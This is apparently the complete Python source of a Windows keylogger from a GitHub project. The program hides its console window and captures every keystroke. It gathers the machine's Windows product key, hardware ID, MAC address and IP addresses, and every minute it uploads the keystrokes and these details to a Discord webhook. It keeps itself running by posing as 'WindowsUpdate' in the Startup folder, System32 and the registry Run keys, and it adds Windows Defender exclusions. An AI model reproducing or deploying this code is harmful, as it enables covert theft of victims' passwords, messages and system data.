import os
import wmi
import sys
import re
import time
import uuid
import httpx
import socket
import ctypes
import subprocess
import winreg
from threading import Timer
from discordwebhook import Discord
from pynput.keyboard import Listener
from win32gui import ShowWindow
from win32console import GetConsoleWindow

class Keylogger:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/..."
        self.cooldown = 60
        self.logs_path = os.environ['temp'] + "\\log.txt"
        self.logs = ""
        
    def on_press(self, key):
        try:
            key = str(key).strip('\'')
            match key:
                case 'Key.enter':
                    self.logs += '[ENTER]\n'
                case 'Key.backspace':
                    self.logs += '[BACKSPACE]'
                case 'Key.space':
                    self.logs += ' '
                case 'Key.alt_l':
                     self.logs += '[ALT]'
                case 'Key.tab':
                     self.logs += '[TAB]'
                case 'Key.delete':
                     self.logs += '[DEL]'
                case 'Key.ctrl_l':
                     self.logs += '[CTRL]'
                case 'Key.left':
                     self.logs += '[LEFT ARROW]'
                case 'Key.right':
                     self.logs += '[RIGHT ARROW]'
                case 'Key.up':
                     self.logs += '[UP ARROW]'
                case 'Key.down':
                     self.logs += '[DOWN ARROW]'
                case 'Key.shift':
                     self.logs += '[SHIFT]'
                case '\\x13':
                    self.logs += '[CTRL+S]'
                case '\\x17':
                    self.logs += '[CTRL+W]'
                case 'Key.caps_lock':
                    self.logs += '[CAPS LK]'
                case '\\x01':
                    self.logs += '[CTRL+A]'
                case 'Key.esc':
                    self.logs += '[ESC]'
                case 'Key.cmd':
                    self.logs += '[WIN KEY]'
                case 'Key.print_screen':
                    self.logs += '[PRINT SCR]'
                case '\\x03':
                    self.logs += '[CTRL+C]'
                case '\\x16':
                    self.logs += '[CTRL+V]'
                case unhandled:
                    self.logs += key

            with open(self.logs_path, "w") as f:
                    f.write(self.logs)
        except Exception as e:
            print(e)
    
    def get_system_info(self):
        try:
            try:
                winkey = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
            except Exception:
                winkey = "N/A (Likely Pirated)"
            try:
                product_name = subprocess.check_output(r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
            except Exception:
                product_name = "N/A"

            return {
                "public_ip": httpx.get('https://api.ipify.org').text,
                "private_ip": socket.gethostbyname(socket.gethostname()),
                "cpu": wmi.WMI().Win32_Processor()[0].Name,
                "gpu": wmi.WMI().Win32_VideoController()[0].Name,
                "mem": round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0),
                "hwid": subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip(),
                "mac": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
                "product_name": product_name,
                "winkey": winkey
            }
        
        except:
            pass

    def send_to_webhook(self):
        try:
            webhook = Discord(url=self.webhook)
            webhook.post(
                    embeds=[{
                  "title": "Captured keystrokes",
                  "color": 15844367,
                  "fields": [
                    {
                      "name": "🦄  User",
                      "value": f"```\nHostname: {os.getenv('COMPUTERNAME')}\nUser name: {os.getenv('UserName')}\n```",
                      "inline": False
                    },
                    {
                      "name": "🔧  System",
                      "value": f"```\nCPU: {self.system_info['cpu']} \nGPU: {self.system_info['gpu']}\nMEM: {self.system_info['mem']}\nHWID: {self.system_info['hwid']}\nProduct name: {self.system_info['product_name']}\nActivation key: {self.system_info['winkey']}```"
                    },
                    {
                      "name": "🌏  Network",
                      "value": f"```\nMAC: {self.system_info['mac']}\nIP Public: {self.system_info['public_ip'] if self.system_info['public_ip'] else 'N/A'}\nIP Private: {self.system_info['private_ip']}\n```"
                    }
                  ],
                   "footer": {"text": "🌟・Logger By Plasmonix・https://github.com/Plasmonix/Discord-keylogger"},
                    }])
            
            with open(self.logs_path, 'rb') as f:
                httpx.post(self.webhook, files={'upload_file': f}) 
            if os.path.exists(self.logs_path):
                os.remove(self.logs_path)
        except Exception as e:
            print(e)
    
    def _worker(self):
        if len(self.logs) > 1:
            self.send_to_webhook()
            self.logs = ""
        timer = Timer(interval=self.cooldown, function=self._worker)
        timer.daemon = True
        timer.start()

    def copy_file(src, dst):
        ctypes.WinDLL("kernel32").CopyFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_bool]
        ctypes.WinDLL("kernel32").CopyFileW(src, dst, False)
    
    def hide_window(self):
        win = GetConsoleWindow()
        ShowWindow(win, 0)
    
    def persistence(self):
        src = os.getcwd() + "\\" + sys.argv[0]
        filename = os.path.split(src)[1]
        ext = filename.split(".")[-1]
        
        self.copy_file(src, f"C:\\Users\\{os.environ['username']}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.{ext}")
        self.copy_file(src, f"C:\\Windows\\System32\\WindowsUpdate.{ext}")
        
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", None, winreg.REG_SZ, f"C:\\Windows\\System32\\WindowsUpdate.{ext}")
        winreg.CloseKey(key)

        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "WindowsUpdate", None, winreg.REG_SZ, f"C:\\Windows\\System32\\WindowsUpdate.{ext}")
        winreg.CloseKey(key)

        subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)
    
    def main(self):
        self.hide_window()
        self.persistence()
        self.system_info = self.get_system_info()
        self._worker()
        while True:
            try:
                listener = Listener(on_press=self.on_press)
                listener.start()
                listener.join()
            except Exception:
                time.sleep(1)
                continue

if __name__ == "__main__":
    Keylogger().main()
   
